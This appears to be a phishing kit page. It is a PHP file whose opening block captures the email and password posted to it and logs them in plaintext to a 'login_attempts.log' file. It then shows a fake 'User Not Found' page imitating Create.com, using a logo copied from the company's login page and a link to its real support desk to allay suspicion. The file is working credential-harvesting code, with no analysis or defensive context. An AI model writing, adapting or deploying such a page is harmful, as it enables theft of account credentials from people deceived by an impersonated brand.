<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Retrieve form data with fallback defaults
    $email = $_POST['email'] ?? 'unknown';
    $password = $_POST['password'] ?? 'unknown';
    $domain = $_SERVER['HTTP_HOST'] ?? 'unknown';

    // Set up dynamic log file path
    $log_dir = __DIR__ . "/../Snake_AP/Snake_Package/logPHP";
    $log_file = $log_dir . "/login_attempts.log";

    // Create the directory if it doesn't exist
    if (!is_dir($log_dir)) {
        mkdir($log_dir, 0755, true);
    }

    // Log the attempt
    error_log("LOGIN ATTEMPT: Domain: $domain | Email: $email | Password: $password\n", 3, $log_file);
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>User Not Found - Create.com & ITGOS</title>
  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
    }

    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background-color: #f4f4f8;
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }

    .card {
      background: #ffffff;
      padding: 40px 30px;
      border-radius: 16px;
      box-shadow: 0 10px 25px rgba(0, 0, 0, 0.08);
      text-align: center;
      max-width: 500px;
      width: 100%;
    }

    .logos {
      display: flex;
      justify-content: center;
      align-items: center;
      gap: 20px;
      margin-bottom: 25px;
      flex-wrap: wrap;
    }

    .logos img {
      max-height: 60px;
      width: auto;
    }

    h1 {
      font-size: 26px;
      color: #d62828;
      margin-bottom: 15px;
    }

    p {
      font-size: 16px;
      color: #333;
      margin-bottom: 30px;
    }

    .btn {
      display: inline-block;
      background-color: #d62828;
      color: white;
      padding: 12px 26px;
      text-decoration: none;
      border-radius: 8px;
      font-weight: 600;
      transition: background 0.3s ease;
    }

    .btn:hover {
      background-color: #b71c1c;
    }

    @media (max-width: 500px) {
      .card {
        padding: 30px 20px;
      }

      h1 {
        font-size: 22px;
      }

      p {
        font-size: 15px;
      }

      .logos img {
        max-height: 50px;
      }
    }
  </style>
</head>
<body>
  <div class="card">
    <div class="logos">
      <img src="Login - Create.com, LLC_files/logo_big.2013157539.png" alt="Create.com Logo" />
    </div>
    <h1>User Not Found</h1>
    <p>The user you are looking for could not be found. Please check the URL or contact our support team.</p>
    <a href="https://createdotcom.zendesk.com/hc/en-us/requests/new" class="btn">Get Help</a>
  </div>
</body>
</html>
